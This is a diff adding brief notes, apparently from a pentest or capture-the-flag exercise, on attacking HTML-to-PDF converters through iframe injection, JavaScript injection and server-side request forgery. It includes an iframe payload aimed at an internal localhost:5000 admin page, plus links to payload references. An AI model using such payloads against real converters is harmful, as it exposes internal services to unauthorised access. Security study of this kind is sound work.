@@ -1,0 +1,19 @@
+in pdf converter
+
+iframe injection
+
+js injection
+
+ssrf
+
+```
+<iframe src="http://localhost:5000/admin"></iframe>
+```
+
+try localhost 5000
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+
+methods :
+
+https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/
